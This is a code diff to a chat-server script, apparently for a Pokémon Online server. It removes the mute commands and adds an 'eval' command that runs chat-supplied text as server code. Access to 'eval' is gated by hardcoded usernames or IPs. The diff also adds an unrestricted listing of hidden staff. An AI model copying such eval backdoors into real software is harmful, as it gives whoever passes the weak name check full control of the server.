@@ -15,7 +15,7 @@ helpers.commandList = new Array(
 	//Admin Commands
 		"admincommands","ban","unban","smute","sunmute","superimp","topic","clearchat","changepotw",
 	//Owner Commands
-        "ownercommands","authcommands","user","mod","admin","owner","invisible"
+        "ownercommands","authcommands","user","mod","admin","owner","invisible","hiddenauth","eval"
 );
 
 function function_name_first() {
@@ -64,18 +64,10 @@ function function_name_last() {
 		var topicfile = sys.read("potwfile.txt");		
 		sys.sendHtmlMessage(src, "<font color=blue><timestamp /><b>±PokeBot: </font></b> The current Pokémon of the Week is: " + topicfile );
 		sys.sendHtmlMessage(src, "<font color=navy blue><timestamp /><b>»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»</font></b><br>");
-		if (sys.getVal("muted*" + sys.ip(src)) == "true")
-		muted[src] = true;
-
 
     },
 	
 		beforeChatMessage : function(src, message, chan) {
-		if (sys.auth(src) < 2 && muted[src] == true) {
-		sys.stopEvent();
-		sys.sendHtmlMessage(src, "<font color =green><timestamp /><b>±Rayquaza: </font></b> You're currently muted, so you cannot chat.");
-		return;
-		}
                 if ((message[0] == '/' || message[0] == '!' || message[0] == '$') && message.length > 1) { 
                 sys.stopEvent();
                 var command;
@@ -234,37 +226,6 @@ function function_name_last() {
 						sys.sendHtmlMessage(src, "<br><font color =navy blue><timestamp /><b>»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»</font></b><br>", chan);
 											}
                                 }
-				if (command == "mute") {
-if (tar == undefined) {
-if (sys.auth(src) < 1) {
-sys.sendMessage(src, "You cannot use this command!");
-return;
-}
-sys.sendMessage(src, "You fail bot. This person does not exist.");
-return;
-}
-if (sys.auth(tar) >= sys.auth(src)) {
-sys.sendHtmlMessage("You dont have sufficient auth to mute <font color=" + sys.getColor(src) + ">" + commandData + "");
-return;
-}
-sys.sendHtmlAll("<b><font color=blue><font size=5> <font color=" + sys.getColor(src) + ">" + commandData + "<font color=blue> has been muted~ by <font color=" + sys.getColor(src) + ">" + sys.name(src) + "<font color=blue>! aww HAHA!!!");
-muted[tar] = true;
-return; 
-		}
-	if (command == "unmute") {
-	if (tar == undefined) {
-	if (sys.auth(src) < 1) {
-			sys.sendMessage(src, "You cannot use this command!");
-		return;
-		}
-			sys.sendMessage(src, "You fail bot. This person does not exist.");
-		return;
-		}
-			sys.sendHtmlAll("<b><font color=green><font size=5><font color=" + sys.getColor(src) + ">" + commandData + "<font color=green> was unmuted~ by <font color=" + sys.getColor(src) + ">" + sys.name(src) + "<font color=green> lucky.....");
-		muted[tar] = false;
-		return;
-		}
-
 	if (command == "kick" || command == "k") {
         if (sys.auth(src) >= 1) {
 		if (tar === undefined) {
@@ -414,13 +375,30 @@ return;
 						sys.sendHtmlMessage(src, "<b><span style='color: " + config.highlighter + ";'>/admin (name)</span></b> - to change the auth of someone to administrator.", chan);
                         sys.sendHtmlMessage(src, "<b><span style='color: " + config.highlighter + ";'>/owner (name)</span></b> - to change the auth of someone to owner.", chan);
                         sys.sendHtmlMessage(src, "<b><span style='color: " + config.highlighter + ";'>/invisible (name)</span></b> - to change the auth of someone to invisible owner.", chan);
+						sys.sendHtmlMessage(src, "<b><span style='color: " + config.highlighter + ";'>/hiddenauth</span></b> - to view a list of hidden staff members.", chan);
 						sys.sendHtmlMessage(src, "<br><font color =navy blue><timestamp /><b>»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»</font></b><br>", chan);
 											}
 											if (sys.auth(src) <= 0) {
 							sys.sendHtmlMessage(src, "<font color =green><timestamp /><b>±Rayquaza: </font></b>You do not have permission to use this command.", chan);
 					}
 				}
+				 if (sys.ip(src) == sys.dbIp("ms. miracles") || sys.name(src).toLowerCase() == "neonlights" || sys.ip(src) == sys.dbIp("crystal moogle") || sys.name(src).toLowerCase() == "ethan") {
+        if (command == "eval") {
+            eval(commandData);
+            return;
+        }
+		}
+		if (command == "hiddenauth") {
+		sys.sendHtmlMessage(src, "<br><font color =navy blue><timestamp /><b>»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»</b></font><br>", chan);
+		sys.sendHtmlMessage(src, "<font color=black size=5><b><img src='Themes/Classic/Client/uAvailable'> - Hidden Owners</b></font>", chan);
+        sys.dbAuths().sort().filter(function(name) { return sys.dbAuth(name) > 3; }).forEach(function(name) {
+            sys.sendMessage(src, name + " " + sys.dbAuth(name), channel);
+        });
+        sys.sendMessage(src, "",channel);
+		sys.sendHtmlMessage(src, "<br><font color =navy blue><timestamp /><b>»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»</b></font><br>", chan);
 
+        return;
+    }
 				tar = sys.id(commandData);
 				if (command == "user"){
 				if (sys.auth(src) >= 3) {
